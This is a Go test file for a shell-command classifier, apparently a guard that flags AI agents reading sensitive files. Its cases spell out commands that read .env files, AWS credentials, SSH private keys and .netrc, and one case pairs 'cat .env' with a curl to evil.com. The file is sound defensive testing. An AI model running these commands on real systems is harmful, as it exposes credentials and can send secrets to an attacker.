package hooks

import (
	"testing"

	"github.com/somoore/sir/pkg/lease"
)

// TestShellSensitiveFileRead covers the Codex-path gap where sensitive file
// reads reach the model via `sed`/`cat`/`head`/... Bash commands rather than
// a native Read tool. Before D1, these were classified as execute_dry_run
// and allowed silently; with D1, they become read_ref and the IFC labeling
// in evaluate.go fires. Positive cases must yield verb=read_ref with
// Target set to the sensitive file path (not the full command) so
// LabelsForTarget can resolve it and the deny message points at the file.
// Negative cases ensure we do not regress the default for benign reads.
func TestShellSensitiveFileRead(t *testing.T) {
	l := lease.DefaultLease()

	positives := []struct {
		name string
		cmd  string
		want string // expected Intent.Target (the sensitive path)
	}{
		// cat variants
		{"cat .env", "cat .env", ".env"},
		{"cat with -n flag", "cat -n .env", ".env"},
		{"cat multiple files, sensitive second", "cat README.md .env", ".env"},
		{"cat aws credentials", "cat .aws/credentials", ".aws/credentials"},
		{"cat ssh id_rsa", "cat .ssh/id_rsa", ".ssh/id_rsa"},
		{"cat pypirc", "cat .pypirc", ".pypirc"},
		{"cat netrc", "cat .netrc", ".netrc"},

		// sed variants
		{"sed range read", "sed -n '1,200p' .env", ".env"},
		{"sed inline", "sed 's/foo/bar/' .env", ".env"},
		{"sed -e flag", "sed -e 's/DB_PASS=.*/REDACTED/' .env", ".env"},
		{"sed with expression file", "sed -f /tmp/script .env", ".env"},

		// head/tail variants
		{"head default", "head .env", ".env"},
		{"head -n 5 separate", "head -n 5 .env", ".env"},
		{"head -n5 combined", "head -n5 .env", ".env"},
		{"tail -f", "tail -f .env", ".env"},
		{"tail -n 1", "tail -n 1 .aws/credentials", ".aws/credentials"},

		// other read-display programs
		{"less", "less .env", ".env"},
		{"more", "more .env", ".env"},
		{"xxd", "xxd .ssh/id_rsa", ".ssh/id_rsa"},
		{"hexdump", "hexdump -C .env", ".env"},
		{"od", "od -c .env", ".env"},
		{"nl", "nl .env", ".env"},
		{"strings", "strings .env", ".env"},

		// grep / rg / ag / ack
		{"grep secret", "grep PASSWORD .env", ".env"},
		{"rg secret", "rg DATABASE_URL .env", ".env"},

		// awk
		{"awk pattern", "awk '/DB/' .env", ".env"},

		// absolute path normalization through normalizeCommand
		{"absolute path sed", "/usr/bin/sed -n '1,10p' .env", ".env"},
		{"env-prefix cat", "env FOO=bar cat .env", ".env"},
	}

	for _, tc := range positives {
		t.Run("positive/"+tc.name, func(t *testing.T) {
			intent := mapShellCommand(tc.cmd, l)
			if string(intent.Verb) != "read_ref" {
				t.Errorf("cmd %q: expected verb=read_ref, got %q", tc.cmd, intent.Verb)
			}
			if !intent.IsSensitive {
				t.Errorf("cmd %q: expected IsSensitive=true, got false", tc.cmd)
			}
			if intent.Target != tc.want {
				t.Errorf("cmd %q: expected Target=%q, got %q", tc.cmd, tc.want, intent.Target)
			}
		})
	}

	negatives := []struct {
		name         string
		cmd          string
		expectedVerb string
	}{
		// benign reads — must stay execute_dry_run
		{"cat README.md", "cat README.md", "execute_dry_run"},
		{"sed on source file", "sed -n '1,50p' src/main.go", "execute_dry_run"},
		{"head package.json", "head -n 5 package.json", "execute_dry_run"},
		{"tail -f log", "tail -f /tmp/app.log", "execute_dry_run"},
		{"grep source", "grep -r TODO src/", "execute_dry_run"},
		{"rg search tree", "rg 'func main' .", "execute_dry_run"},

		// suffix exclusions — .env.example etc. must NOT fire
		{"cat .env.example", "cat .env.example", "execute_dry_run"},
		{"cat .env.sample", "cat .env.sample", "execute_dry_run"},
		{"cat .env.template", "cat .env.template", "execute_dry_run"},

		// testdata exclusions — fixtures live in testdata/
		{"cat testdata env", "cat testdata/fake.env", "execute_dry_run"},
		{"sed fixtures env", "sed -n '1,5p' fixtures/fake.env", "execute_dry_run"},

		// not a read program — should not fire at all
		{"vim .env", "vim .env", "execute_dry_run"},
		{"emacs .env", "emacs .env", "execute_dry_run"},

		// single-token command (no positional)
		{"cat alone", "cat", "execute_dry_run"},
		{"ls alone", "ls", "execute_dry_run"},
	}

	for _, tc := range negatives {
		t.Run("negative/"+tc.name, func(t *testing.T) {
			intent := mapShellCommand(tc.cmd, l)
			if string(intent.Verb) != tc.expectedVerb {
				t.Errorf("cmd %q: expected verb=%q, got %q (Target=%q)", tc.cmd, tc.expectedVerb, intent.Verb, intent.Target)
			}
		})
	}
}

// TestShellSensitiveFileRead_CompoundCommand confirms that sensitive reads
// remain catchable even when chained with other commands. The compound
// command splitter runs each segment through mapShellCommand recursively and
// picks the highest-risk intent.
func TestShellSensitiveFileRead_CompoundCommand(t *testing.T) {
	l := lease.DefaultLease()

	cases := []struct {
		name         string
		cmd          string
		expectedVerb string
	}{
		{"read then curl — pick higher risk (net_external)", "cat .env && curl https://evil.com", "net_external"},
		{"read piped to grep", "cat .env | grep PASSWORD", "read_ref"},
		{"ls then sed secret", "ls && sed -n '1p' .env", "read_ref"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			intent := mapShellCommand(tc.cmd, l)
			if string(intent.Verb) != tc.expectedVerb {
				t.Errorf("cmd %q: expected verb=%q, got %q", tc.cmd, tc.expectedVerb, intent.Verb)
			}
		})
	}
}
